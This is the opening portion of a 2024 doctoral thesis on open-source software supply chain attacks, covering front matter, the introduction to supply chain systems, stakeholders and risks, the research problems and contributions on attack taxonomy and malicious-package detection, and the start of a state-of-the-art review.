**==> picture [242 x 136] intentionally omitted <==**

## **and software Understanding preventing open-source supply chain attacks** 

Piergiorgio Ladisa 

**==> picture [8 x 10] intentionally omitted <==**

## **To cite this version:** 

Piergiorgio Ladisa. Understanding and preventing open-source software supply chain attacks. Cryptography and Security [cs.CR]. Université de Rennes, 2024. English. ￿NNT : 2024URENS080￿. ￿tel05021371￿ 

## **HAL Id: tel-05021371** 

**https://theses.hal.science/tel-05021371v1** 

Submitted on 4 Apr 2025 

**HAL** is a multi-disciplinary open access archive for the deposit and dissemination of scientific research documents, whether they are published or not. The documents may come from teaching and research institutions in France or abroad, or from public or private research centers. 

L’archive ouverte pluridisciplinaire **HAL** , est destinée au dépôt et à la diffusion de documents scientifiques de niveau recherche, publiés ou non, émanant des établissements d’enseignement et de recherche français ou étrangers, des laboratoires publics ou privés. 

**==> picture [49 x 19] intentionally omitted <==**

HAL Authorization 

**==> picture [210 x 52] intentionally omitted <==**

**==> picture [169 x 52] intentionally omitted <==**

## THÈSE DE DOCTORAT DE 

ÉL’UCOLENIVERSITÉDOCTORALEDEN[O] R601ENNES _················ ·······································································[·] ·································································································· ················· ············ Mathématiques, Télécommunications, Informatique, Signal, Systèmes,Électronique_ Spécialité :Par _Informatique ······_ _**·** ······················· ·_ _**·** ············_ _**·** ·······[·] ····_ _**·** ··· ····································· ·····················_ _**·** ··························_ _**·** ············ ········_ 

## **Piergiorgio LADISA** 

**Understanding and Preventing Open-Source Software Supply Chain Attacks** 

**Thèse présentée et soutenue à Mougins, le 9 Mars 2024 Unité de recherche : IRISA** 

## **Rapporteurs avant soutenance :** 

Laurie WILLIAMS Distinguished University Professor at North Carolina State University Benoit BAUDRY Professor at KTH Royal Institute of Technology 

## **Composition du Jury :** 

Président : Philippe COLLET Full Professor at Université de Nice Côte d’Azur Examinateurs : Laurie WILLIAMS Distinguished University Professor at North Carolina State University Benoit BAUDRY Professor at KTH Royal Institute of Technology Martin JOHNS Full professor at Technical University Braunschweig Dir. de thèse : Olivier BARAIS Full Professor at Université de Rennes Co-dir. de thèse : Matias MARTINEZ Professor at Universitat Politècnica de Catalunya-BarcelonaTech Serena Elisa PONTA Principal Research Scientist at SAP 

## **LIST OF RESEARCH PAPERS** 

This list contains the papers included in the thesis and are presented in chronological order: 

1. Ladisa, P., Plate, H., Martinez, M., Barais, O., & Ponta, S. E. (2022, November). Towards the Detection of Malicious Java Packages. In Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses (pp. 63-72). DOI: `10.1145/3560835.3564548` 

2. Ladisa, P., Plate, H., Martinez, M., Barais, O., & Ponta, S. E. (2022, November). Risk Explorer for Software Supply Chains: Understanding the Attack Surface of Open-Source based Software Development. In Proceedings of the 2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses (pp. 35-36). DOI: `10.1145/3560835.3564546` 

3. Ladisa, P., Plate, H., Martinez, M., & Barais, O. (2023, May). Sok: Taxonomy of attacks on open-source software supply chains. In 2023 IEEE Symposium on Security and Privacy (SP) (pp. 1509-1526). IEEE. DOI: `10.1109/SP46215.2023. 10179304` 

4. Ladisa, P., Sahin, M., Ponta, S. E., Rosa, M., Martinez, M., & Barais, O. (2023). The Hitchhiker’s Guide to Malicious Third-Party Dependencies. In Proceedings of the 2023 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses. DOI: `10.1145/3605770.3625212` 

5. Ladisa, P., Ponta, S. E., Ronzoni, N., Martinez, M., & Barais, O. (2023, December). On the Feasibility of Cross-Language Detection of Malicious Packages in npm and PyPI. In Proceedings of the 39th Annual Computer Security Applications Conference. DOI: `10.1145/3627106.3627138` 

6. Ladisa, P., Ponta, S. E., Sabetta, A., Martinez, M., & Barais, O. (2023, December). Journey to the Center of Software Supply Chain Attacks. In IEEE Security & Privacy, vol. , no. 01, pp. 2-17, 5555. DOI: `10.1109/MSEC.2023.3302066` 

3 

## **ACKNOWLEDGEMENT** 

This doctoral thesis marks the conclusion of one of the most beautiful chapters of my life, which has shaped me not only from a professional perspective but above all as a human being. In this journey, as beautiful as it was challenging, I had the privilege of never feeling alone. On the contrary, I was accompanied by numerous people to whom I extend my heartfelt gratitude. 

First and foremost, I will be forever grateful to my supervisors Serena, Matias, and Olivier for believing in me from the very beginning, for supporting me even during the most difficult challenges, for all the constructive discussions, and for their professional and human guidance. 

Similarly, I cannot refrain from thanking all the brilliant individuals I encountered during my doctoral path. They inspired me with their experience and knowledge. Special thanks to Laurie, Benoit, and Martin. 

I am extremely grateful to all my colleagues at the SAP Security Research team, who have become a second family to me over the years and will always hold a special place in my heart. 

I also want to express my gratitude to my friends, who have consistently supported me even during the most challenging moments. 

Lastly, a heartfelt thank you goes to my family, my guiding star in life. 

To all of you, it has been an honor for me to feel like I was standing on the shoulders of giants. 

5 

## **TABLE OF CONTENTS** 

|**List of **|**List of **|**Papers**|**3**|
|---|---|---|---|
|**Acknowledgement**|||**5**|
|**List of **||**Acronyms**|**11**|
|**1**|**Introduction**||**13**|
||1.1|Open-Source Software Supply Chains . . . . . . . . . . . . . . . . . . . . .|15|
||1.2|Risks of Open-Source Software Supply Chains . . . . . . . . . . . . . . . .|17|
||1.3|Problem Statement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|18|
||1.4|Summary of Thesis Contributions . . . . . . . . . . . . . . . . . . . . . . .|19|
||1.5|Thesis Outline . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|21|
|**2**|**State of the Art**||**25**|
||2.1|Understanding Software Supply Chain Attacks . . . . . . . . . . . . . . . .|25|
||2.2|Preventing Software Supply Chain Attacks through the Detection of Mali-||
|||cious Packages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|31|
|||2.2.1<br>Software Supply Chain Security Frameworks . . . . . . . . . . . . .|31|
|||2.2.2<br>State of the Art on the Detection of Malicious Packages<br>. . . . . .|33|
|**3**|**Novelty of Thesis Contributions**||**41**|
||3.1|Novelty in the Understanding of Software Supply Chain Attacks . . . . . .|43|
||3.2|Novelty in the Prevention of Software Supply Chain Attacks . . . . . . . .|45|
|**4**|**Contribution 1 - Taxonomy of Attacks on Open-Source Software Supply**|||
||**Chains**||**49**|
||4.1|Methodology<br>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|50|
||4.2|Attack Taxonomy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|58|
||4.3|Validation and Assessment . . . . . . . . . . . . . . . . . . . . . . . . . . .|65|
||4.4|Discussion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|69|
||4.5|Threats to Validity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .|72|



7 

## TABLE OF CONTENTS 

||4.6|Conclusion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|73|
|---|---|---|---|---|
|**5**|**Contribution 2 - Mapping of Existing Safeguards to Related Attack**||||
||**Vectors**|||**75**|
||5.1|Methodology<br>. . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|76|
||5.2|List of Safeguards . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|77|
||5.3|Experts Validation and Assessment .|. . . . . . . . . . . . . . . . . . . . .|79|
||5.4|Developers Validation and Assessment|. . . . . . . . . . . . . . . . . . . .|82|
||5.5|Conclusion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|83|
|**6**|**Contribution 3 - Understanding How Third-Party Dependencies Achieve**||||
||**Execution on Downstream Systems**|||**85**|
||6.1|Methodology<br>. . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|87|
||6.2|Arbitrary Code Execution Strategies|. . . . . . . . . . . . . . . . . . . . .|89|
||6.3|Evasion Techniques . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|98|
||6.4|Conclusion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|104|
|**7**|**Contribution 4 - Evaluation of ML-based Approach to the Detection of**||||
||**Malicious Packages in JavaScript and **||**Python**|**107**|
||7.1|Methodology<br>. . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|109|
||7.2|Controlled Experiment . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|119|
||7.3|Real-World Evaluation . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|122|
||7.4|Discussion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|123|
||7.5|Threats to Validity . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|127|
||7.6|Conclusion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|128|
|**8**|**Contribution 5 - Evaluation of Static Approach to the Detection of Ma-**||||
||**licious Packages in Java**|||**129**|
||8.1|Methodology<br>. . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|131|
||8.2|Indicators of Malicious Bytecode<br>. .|. . . . . . . . . . . . . . . . . . . . .|135|
||8.3|Experiment<br>. . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|139|
||8.4|Limitations<br>. . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|144|
||8.5|Conclusion . . . . . . . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . .|145|
|**9**|**Industrial Impact**|||**147**|
||9.1|Risk Explorer for Software Supply Chains<br>. . . . . . . . . . . . . . . . . .||147|



8 

TABLE OF CONTENTS 

||9.1.1<br>Industrial Use Cases|. . . . . . . . . . . . . . . . . . . . . . . . . . 149|
|---|---|---|
||9.1.2<br>Adding a new attack|reference: the case of PyTorch-nightly.<br>. . . . 151|
||9.1.3<br>How To Contribute .|. . . . . . . . . . . . . . . . . . . . . . . . . . 152|
|9.2|Open-Source Contributions .|. . . . . . . . . . . . . . . . . . . . . . . . . . 153|
||9.2.1<br>Risk Explorer - Execution Proof-of-Concepts . . . . . . . . . . . . . 153||
||9.2.2<br>Cross-language Detection Artifacts and Malwares Report . . . . . . 154||
|**10 Conclusions and Perspectives**||**157**|
|10.1|Key Results . . . . . . . . .|. . . . . . . . . . . . . . . . . . . . . . . . . . 157|
|10.2|Refections on Software Supply Chain Security Research<br>. . . . . . . . . . 158||
|10.3|Future Works and Perspectives<br>. . . . . . . . . . . . . . . . . . . . . . . . 161||
|**Bibliography**||**165**|
|**A User Survey Demographics**||**191**|



9 

## **LIST OF ACRONYMS** 

- **ACE** Arbitrary Code Execution 

- **AST** Abstract Syntax Tree **AV** Antivirus 

- **BKC** Backstabber’s Knife Collection 

- **BO** Bayesian Optimizer 

- **CAPEC** Common Attack Pattern Enumeration and Classification 

- **CD** Continuous Delivery 

- **CDN** Content Delivery Network **CI** Continuous Integration 

- **CWE** Common Weakness Enumeration 

- **DDC** Diverse Double-Compiling 

- **DoS** Denial of Service 

- **DT** Decision Tree 

- **GL** Generalization Language 

- **JIT** Just-In-Time 

- **JVM** Java Virtual Machine 

- **LFI** Local File Inclusion 

- **LLMs** Large Language Models 

- **LOC** Lines Of Code 

- **MFA** Multi-Factor Authentication **MITM** Man-In-The-Middle **ML** Machine Learning 

- **OSS** Open-Source Software **OSINT** Open Source Intelligence 

11 

TABLE OF CONTENTS 

**PII** Personally Identifiable Information **RASP** Runtime Application Self-Protection **RF** Random Forest **SBOM** Software Bill of Materials **S2C2F** Secure Supply Chain Consumption Framework **SCA** Software Composition Analysis **SCVS** Software Component Verification Standard **SDLC** Software Development LifeCycle **SE** Social Engineering 

- **SLR** Systematic Literature Review **SLSA** Supply-chain Levels for Software Artifacts **TARA** Threat Analysis and Remediation Assessment 

**TF-IDF** Term Frequency-Inverse Document Frequency **TTPs** Tactics, Techniques, and Procedure(s) **TUF** The Update Framework **U/C** Utility-to-Cost **UI** User Interface **UX** User eXperience **VCS** Version Control System **VMs** Virtual Machines **VT** VirusTotal **XGBoost** eXtreme Gradient Boosting 

12 

Chapter 1 

## **INTRODUCTION** 

Software modularization is a fundamental practice in modern software development, enabling the division of complex systems into manageable components and promoting software reusability. Open-Source Software (OSS) plays a central role by offering a wide range of pre-built and reusable modules that enhance productivity. Furthermore, OSS is widely adopted across the technology stack and development lifecycle, in both the private and public sectors, and can comprise up to 98% of a codebase [7]. 

In software development, when dependencies are used directly in a software (referred to as _direct dependencies_ ), each of these direct dependencies, in turn, may have their own dependencies (known as _indirect_ or _transitive dependencies_ ). The collection of these dependencies, their interconnections, and the suppliers responsible for them collectively constitute what is commonly referred to as the _open-source software supply chain_ . 

To facilitate the integration of OSS across the Software Development LifeCycle (SDLC) and simplify the management of dependencies, dedicated package repositories and languagespecific package managers have been established. These repositories function as centralized databases where developers can easily discover, download, install, and manage opensource modules. On the client side, package managers are tools that assist downstream users in the automated resolution and installation of required packages, including their dependencies. Figure 1.1 depicts the lifecycle of a 3rd-party dependency (both direct and transitive) from the perspective of a downstream project. We can distinguish two main 

**==> picture [454 x 81] intentionally omitted <==**

**----- Start of picture text -----**<br>
Installation Phase<br>Fetch  Extract  source distribution<br>Build Run<br>package archive<br>pre-built distribution<br>**----- End of picture text -----**<br>


– Figure 1.1 Lifecycle of a 3rd-party dependency (both direct and transitive) from the perspective of a downstream project. 

13 

_Introduction_ 

phases: _install_ and _run_ . During the installation phase, the package manager on the client side fetches the dependency (i.e., a package) from the package repository and extracts it locally. If the package distribution is of _source_ type (i.e., it contains only the source code), it is built for the target architecture of the downstream users. On the other hand, if the distribution is pre-built, the retrieved package can be used directly. Once the 3rd-party dependency (along with its related dependencies) is installed, it can be executed within downstream projects, either as part of the main application or during the tests (in case of _test dependencies_ ). 

While the development model based on the use of OSS offers numerous advantages, such as expediting software development and enabling developers to focus on solving their specific problems rather than redeveloping recurring features from scratch, it also entails several inherent risks. Furthermore, the complete automation provided by package managers and the intricate web of dependencies, can obscure the chain of dependencies from end users, who implicitly place trust in each element of this chain, including the authors of these dependencies. 

First, OSS can be susceptible to the presence of (unintended) vulnerabilities, just like any other software. A prominent and recent example illustrating the impact of a severe vulnerability in an open-source component is the case of _log4shell_ [8], [9]. What sets this vulnerability, found in the log4j library, apart is not only its high severity but also the vast number of users (both direct and indirect) it affected. The popularity and criticality of this vulnerability prompted a swift response. However, in the open-source world, such a prompt response is not always guaranteed. Some projects may lack dedicated support or comprehensive documentation, which can make it challenging for users to resolve issues or receive timely assistance. 

Secondly, attackers can exploit the widespread adoption of OSS throughout the SDLC as a means to propagate malware. Generally speaking, _software supply chain attacks_ , which can target both closed-source and open-source software, aim to inject malicious code into software components to compromise consumers of such software products. Prominent incidents, such as the infection of SolarWinds’ Orion platform [10], which was downloaded by approximately 18,000 customers, including government agencies and providers of critical infrastructure, demonstrate the reach and potential impact of such attacks. Open-source software supply chains have also been significantly impacted by these types of attacks [11]– [13], and this trend is on the rise [14]. The severity of this issue is highlighted by the suspension in May 2023 of new user registrations and package uploads on PyPI due to a 

14 

_Introduction_ 

significant increase in malicious activities [15]. 

This exploitation of the _trusting trust_ , as notably highlighted by Ken Thompson already in 1984 [16], has made software supply chain attacks one of the primary threats in today’s threat landscape, as reported by ENISA [17]. Due to the pivotal role of open-source in the modern economy and the software industry, safeguarding the open-source supply chain has garnered public interest and is now integral to national security programs [18]. As a result, academia has also begun to study the problem and define strategies to protect the software supply chain. 

The primary goal of this thesis is to delve into the issue of OSS supply chain attacks, aiming to gain a deeper understanding of these attacks and develop strategies to prevent them. 

## **1.1 Open-Source Software Supply Chains** 

The OSS supply chain encompasses all systems and stakeholders involved in the development, building, and distribution of OSS artifacts to downstream users. These systems and stakeholders commonly engage in distributed interactions [19], although the particulars may vary across different OSS projects. These elements collectively constitute the OSS supply chains and contribute to their attack surface. In order to identify possible threats, it is therefore essential to describe the constituent elements of such an attack surface. Figure 1.2 provides a high-level description of the common OSS development model. 

## **Systems** 

These systems include Version Control System (VCS), build systems, and distribution platforms (e.g., package repositories). They may not always align with distinct physical or virtual entities providing these functions, but should be seen as roles. One host or third-party service can fulfill multiple roles. 

**Version Control Systems** host various components of the OSS project, including program code, metadata, build configurations, and other resources. They track and manage all changes made to the codebase during the development process. While basic VCSs like Git do not mandate user authentication, additional features (e.g., issue trackers) and security controls (e.g., authentication, fine-grained permissions, or review workflows) are offered by complementary tools and third-party services. 

15 

_Introduction_ 

**==> picture [455 x 187] intentionally omitted <==**

**----- Start of picture text -----**<br>
Contributor<br>Project Maintainer<br>PUSH/REVIEW MERGE REQUEST MANAGE ACCOUNT<br>CONFIGURE AND TRIGGER BUILD JOB<br>System  System  System<br>Administrator Administrator Administrator<br>VCS Build System PULL DEPENDENCY Distribution<br>Platform<br>CREATE MERGE REQUEST CLONE Build Job PUBLISH PACKAGE<br>CLONE AND BUILD INSTALL PRE-BUILT PACKAGES<br>Downstream User<br>**----- End of picture text -----**<br>


Figure 1.2 – Stakeholders, systems and their interactions related to the development, build and distribution of OSS artifacts. 

**Build Systems** accept a project’s codebase as input and produce a binary artifact, such as an executable or compressed archive, that can be distributed to downstream users for easy consumption. The build process commonly involves dependency or package managers [20], [21], such as pip for Python, which determine and download all dependencies required for the successful build, including test frameworks or OSS libraries integrated into the project. Continuous Integration (CI)/Continuous Delivery (CD) pipelines, executed by build automation tools like Jenkins, automate testing, building, and deploying project artifacts. 

**Distribution Platforms** distribute pre-built OSS artifacts to downstream users, e.g., through package managers or manual downloads. Our definition encompasses not only prominent public package repositories like PyPI or Maven Central but also internal and external mirrors, Content Delivery Network (CDN), or proxy servers. 

**Workstations of OSS Maintainers and Administrators.** OSS project maintainers and administrators of the aforementioned systems possess privileged access to sensitive resources such as the codebase, a build system’s web interface, or a package repository’s database. Consequently, their workstations are within the scope of the attack scenario. 

## **Stakeholders** 

The stakeholders considered include OSS project maintainers, contributors, and consumers, as well as administrators of various systems or services involved. As with systems, 

16 

_Introduction_ 

it is appropriate to consider stakeholders as roles [22], with the understanding that a single individual may fulfill multiple roles simultaneously. For instance, individuals who are OSS project maintainers often also consume artifacts from other projects, thus assuming the role of consumers as well. 

**Contributors** contribute code to an OSS project, with limited (read-only) access to project resources. They typically submit contributions to the VCS via merge requests, which are reviewed by project maintainers prior to being integrated. 

**OSS Project Maintainers** have privileged access to project resources, e.g., to review and integrate contributors’ merge requests, configure build systems and trigger build jobs, or deploy ready-made artifacts on package repositories. The real names of project collaborators, both contributors and maintainers, are not necessarily known. Accounts, including anonymous ones, gain trust through continued contributions of quality, thanks to which they may be promoted to maintainers (known as a meritocracy). 

**System and Service Administrators** have the responsibility to configure, maintain, and operate any of the above-mentioned systems or services, e.g., employees of 3rd-party Git hosting providers, members of OSS foundations that operate own build systems for their projects, or employees of companies running package repositories like npm. 

**Downstream Users** consume OSS project artifacts, e.g., its source code from the project’s VCSs (e.g., through cloning), or pre-built packages from distribution platforms. In the context of downstream development projects, the download is typically automated by package managers like pip or npm, which identify and obtain dozens or hundreds [23], [24] of the project’s direct and transitive dependencies. 

## **1.2 Risks of Open-Source Software Supply Chains** 

The aforementioned systems inherently function in a distributed manner, and some of the stakeholders may remain partially unknown or anonymous. These systems exist for each individual open-source component used, effectively expanding the attack surface. This expanded attack surface encompasses both technical aspects and social dimensions (for what concerns the interactions and trust between all the stakeholders involved). 

Furthermore, many widely-used open-source projects face challenges related to limited funding and contributions [25]. These constraints make it difficult for project maintainers to ensure the security of their projects and render them more vulnerable to socialengineering attacks (e.g., during the review of contributions). For instance, project main- 

17 

_Introduction_ 

tainers may grant administrative privileges to contributors who offer assistance in project maintenance, unaware that some individuals may have ulterior motives, such as injecting malicious code, as exemplified by the `event-stream` incident [26]. 

On the other side, downstream consumers of open-source software have minimal control and limited visibility into the security practices of the projects they depend on. Due to the substantial number of dependencies [23], conducting comprehensive security reviews for each one is often impractical for consumers. As a result, they need to place a certain level of trust in the open-source community to promptly identify vulnerabilities and potential security threats. 

Because of these many challenges faced by downstream consumers, the appeal for attackers is amplified.Attackers primarily pursue objectives such as data exfiltration, droppers, opening reverse shells, denial of service, or financial gain [27]. Additionally, they aim to disseminate phishing links [28]. As a result, open-source projects with larger user bases, including both direct and indirect users, become more appealing targets for attackers. In line with adversarial strategies observed in other domains, attackers only need to exploit a single vulnerability, while defenders are tasked with protecting the entire attack surface. In this context, the attack surface encompasses the entirety of the software supply chain. 

## **1.3 Problem Statement** 

From a general perspective, the successful execution of an OSS supply chain attack requires the attacker fulfilling mainly three requirements [29]: 

1. Make a malicious package available to downstream users; 

2. Ensure that the downstream users actively engage with the malicious package (e.g., by installing it); 

3. Ensure that the downstream users eventually execute the malicious code contained within the package. 

Thus, we identify the following key problems to be addressed within the context of open-source software supply chain security: 

- **P1 - Lack of Comprehensive Attack Taxonomy** : Due to the complexity and broad scope of the open-source software supply chain’s attack surface, it is crucial to identify and categorize the potential attack vectors available to attackers to inject malicious code into an OSS component. These injections into OSS projects enable 

18 

_Introduction_ 

attackers to ensure that their malware is accessible and consumed by downstream users (i.e., requirements 1 and 2). 

- **P2 - Lack of Comprehensive Safeguards Mapping** : After identifying the potential attack vectors, it is also important to determine the available safeguards that can mitigate them, either partially or completely. 

- **P3 - Lack of Comprehensive Description of Third-Party Dependencies’ Execution Techniques** : In order to prevent a software supply chain attack from succeeding, it is necessary to identify how malicious 3rd-party dependencies ensures to get themselves executed by downstream users (i.e., requirement 3). 

- **P4 - Automate Detection** : Given the large number of open-source components consumed or present in package repositories, it is important to define automated procedures that can detect the presence of malicious code. 

## **1.4 Summary of Thesis Contributions** 

The primary objective of this thesis is to investigate and address the issue of software supply chain attacks, with the specific focus on the open-source context. As previously emphasized, the attack surface in this domain is broad and complex. 

Effectively mitigating open-source software supply chain attacks requires drawing insights from past incidents and providing a comprehensive overview of all potential attack vectors that attackers employ to inject malicious code into open-source components. Additionally, due to the sheer volume of code that needs to be analyzed for malicious behavior, it is essential to establish automated approaches for detecting such behavior in third-party dependencies. 

Table 1.1 offers an overview of the technical contributions presented in each paper published as part of this thesis. Additionally, it outlines the specific problems addressed by each of these contributions. 

To enhance the **understanding** of OSS supply chain attacks, the contributions of this thesis are as follows: 

- **C1 - Taxonomy of Attacks on OSS Supply Chain** : We observed a gap in both academia and industry concerning a comprehensive and technology-agnostic description of open-source software supply chain attacks. As a result, our initial contribution, addressing **P1** , involved organizing and systematizing existing knowl- 

19 

_Introduction_ 

   - edge, culminating in the creation of a taxonomy for open-source software supply chain attacks. The results of this contribution appears as a conference paper in _2023 IEEE Symposium on Security and Privacy_ [1] and as magazine article in _IEEE Security & Privacy_ [3]. 

- **C2 - Mapping of Existing Safeguards to Related Attack Vectors** : By compiling an extensive list of potential (and documented) attack vectors, we were able to associate corresponding safeguards that either fully or partially mitigate these attack vectors. The results of this contribution address **P2** and (as for **C1** ) appears as a conference paper in _2023 IEEE Symposium on Security and Privacy_ [1] and as magazine article in _IEEE Security & Privacy_ [3]. 

- **C3 - Understanding How Third-Party Dependencies Achieve Execution on Downstream Systems** : In this case, our goal is to address **P3** , specifically focusing on investigating how third-party dependencies can achieve Arbitrary Code Execution (ACE) by distributing malicious packages to downstream users. Due to the multitude of programming languages, our analysis is limited to some of the most widely used programming languages and their respective package managers. These include Python (pip), JavaScript (npm), Ruby (gem), PHP (composer), Rust (cargo), Go (go), and Java (mvn). Additionally, we explore the evasion techniques that attackers may employ to circumvent detection measures. The results of this contribution appears as a workshop paper [4] in _2023 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ . 

In the context of **C1** and **C2** , as part of our contributions, we have developed an opensource tool called the _Risk Explorer for Software Supply Chains_ , which is available online[1] . This tool allows users to interactively explore the taxonomy of OSS supply chain attacks and the associated information and is presented in a demo paper [2] published in the _2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ . Regarding **C3** , as part of our contributions, we have open-sourced[2] runnable examples that demonstrate the various ACE techniques identified in the different ecosystems under analysis. 

In the context of the automated **prevention** of OSS supply chain attacks, the contributions of this thesis are as follows: 

> 1. `https://sap.github.io/risk-explorer-for-software-supply-chains/` 

> 2. `https://github.com/SAP-samples/risk-explorer-execution-pocs` 

20 

_Introduction_ 

- **C4 - Evaluation of ML-based Approach to the Detection of Malicious Packages in JavaScript and Python** : To tackle **P4** , we conducted an evaluation in the domains of JavaScript (npm) and Python (PyPI) with a focus on the application of machine learning for detecting malicious packages. Our objective was to assess the feasibility of training a unified model capable of identifying malicious packages in both ecosystems. Through empirical analysis, involving the scanning of daily uploaded packages in both npm and PyPI using our classifier, we successfully detected and promptly reported 58 previously unknown malware instances. This exploration suggests that cross-language detection holds promise for enhancing the detection and prevention of OSS supply chain attacks. The results of this contribution are published as conference paper [5] in the proceedings of the _39th Annual Computer Security Applications Conference_ . 

- **C5 - Evaluation of Static Approach to the Detection of Malicious Packages in Java** : To tackle **P4** in the context of Java, we evaluated a static approach based on the analysis of JVM bytectode to highlight the presence of indicators of malicious behaviors. Such indicators of maliciousness concern the presence of obfuscated or dangerous strings (e.g., shell commands, URLs), as well as the use of security-sensitive APIs (e.g., execution of shell commands, opening connections). We empirically evaluated the significance of the identified indicators and the results of this contribution are presented in a workshop paper [6] published in the _2022 ACM Workshop on Software Supply Chain Offensive Research and Ecosystem Defenses_ . 

In the context of **C4** , to make our results verifiable and reproducible, we have opensourced[3] the training dataset, the best-performing models utilized in our real-world experiment, the list of identified malicious packages, and the scripts necessary to replicate and verify our results. 

## **1.5 Thesis Outline** 

The remainder of the thesis is organized as follows: 

- Chapter 2 presents the current state of the art in the domain of OSS supply chain security, highlighting the novelty of our contributions in this field. 

> 3. `https://github.com/SAP-samples/cross-language-detection-artifacts` 

21 

_Introduction_ 

|**Addressed Problem (P)**<br>**P1**- Lack of Comprehensive<br>Attack Taxonomy<br>**P2**- Lack of Comprehensive<br>Safeguards Mapping<br>**P3** - Lack of Comprehen-<br>sive Description of Third-<br>Party Dependencies’ Execu-<br>tion Techniques<br>**P4** - Automate Detection<br>**P4** - Automate Detection|**Contribution (C)**<br>**C1** - Taxonomy of Attacks<br>on OSS Supply Chain<br>**C2** - Mapping of Existing<br>Safeguards to Related At-<br>tack Vectors<br>**C3** - Understanding How<br>Third-Party<br>Dependen-<br>cies Achieve Execution on<br>Downstream Systems<br>**C4** - Evaluation of ML-<br>based<br>Approach<br>to<br>the<br>Detection<br>of<br>Malicious<br>Packages in JavaScript and<br>Python<br>**C5** - Evaluation of Static<br>Approach to the Detection<br>of Malicious Packages in<br>Java|**Research papers**<br>[1]<br>[2]<br>[3]<br>[4]<br>[5]<br>[6]|
|---|---|---|
||||



– Table 1.1 Mapping of the technical contributions of the thesis to the problems they address and related research papers. 

22 

_Introduction_ 

- Chapter 3 provides an overview of the technical contributions introduced by this thesis. 

- Chapters 4 through 8 provide a detailed account of each contribution in the thesis. These chapters present the research questions, the methodology adopted to address them, and the results. 

- Chapter 9 presents the tool _Risk Explorer for Software Supply Chains_ , the opensource contributions made in the context of the thesis, and discusses the industrial impact. 

- Chapter 10 offers the thesis’s conclusion and outlines potential future perspectives. 

23 

Chapter 2 

## **STATE OF THE ART** 

As organizations and individuals increasingly rely on third-party components and libraries to expedite development and enhance functionality, safeguarding the OSS supply chain has become a prominent concern. While the benefits of utilizing pre-existing code are undeniable, this practice introduces a unique set of challenges and risks, as demonstrated by numerous recent incidents. Additionally, as highlighted in Section 1.1, the OSS supply chain encompasses the intricate network of systems, stakeholders, and their interactions that collectively contribute to every single dependency used in a software product. 

In this chapter, we provide an overview of the most relevant research investigating the security aspects of the OSS supply chain. This provides context for our research and positions our contributions. We begin by analyzing works that aim to better understand the threats in the context of the OSS supply chain. This includes studies related to specific aspects of OSS supply chains, such as technologies, systems, or stakeholder interactions. Then, we discuss the state of the art in the context of preventing OSS chain attacks, with a particular focus on the detection of malicious open-source packages. Finally, we present the novelty of our contributions in comparison to the state of the art. 

## **2.1 Understanding Software Supply Chain Attacks** 

Since the appearance in 1984 of Ken Thompson’s _Reflections on Trusting Trusts_ [16], where he pondered the inherent challenge of trusting programs not authored by oneself due to the risk of trojan horses, the discussion surrounding software supply chain security has steadily grown, especially in recent years. 

From a broader perspective encompassing the entire supply chain, Ohm et al. [27] articulate the problem of software supply chain attacks as follows: 

**Software supply chain attacks** aim at injecting malicious code into a software product. 

25 

Chapter 2 – _State of the Art_ 

By extending this concept, it is possible to define OSS supply chain attacks as follows: 

**Open-source software supply chain attacks** abuse the widespread adoption of OSS to inject malicious code into a software product. 

Regarding the formalization of software supply chain attacks, Okafor et al. [30] synthesize insights from various sources [1], [23], [27], [31], [32], without restricting their focus solely to injection attacks. They delineate software supply chain attacks as comprising a four-stage attack pattern: 

1. _Compromise_ : in this stage, the attacker exploits a vulnerability within the supply chain to initiate the attack; 

2. _Alteration_ : the attacker leverages the initial weakness identified in the supply chain to make alterations; 

3. _Propagation_ : the changes made during the alteration phase are propagated downstream within the supply chain; 

4. _Exploitation_ : finally, the attacker exploits the alterations that have propagated downstream to achieve their objectives. 

Okafor et al. [30] also identify three key security properties that, ideally, would protect against supply chain attacks. 

_Transparency_ involves making the entire supply chain visible and accessible to the actors participating in it. Transparency ensures that the flow of information and processes within the supply chain is open and observable. 

_Validity_ encompasses the authentication of the actors involved in the supply chain and ensures the integrity of operations and artifacts within the chain. It helps in verifying the authenticity and trustworthiness of components and interactions. 

_Separation_ pertains to the compartmentalization of operations, artifacts, and actors within the software supply chain. By separating these elements, it becomes more challenging for malicious actors to compromise the entire chain. 

As the software supply chain is a complex ecosystem comprising various interconnected systems and stakeholders, as observed in Chapter 1, a comprehensive analysis of all potential threats must begin with the identification of the systems and stakeholders involved in the attack surface. Duan et al. [22] have made a valuable contribution by attempting to 

26 

_2.1. Understanding Software Supply Chain Attacks_ 

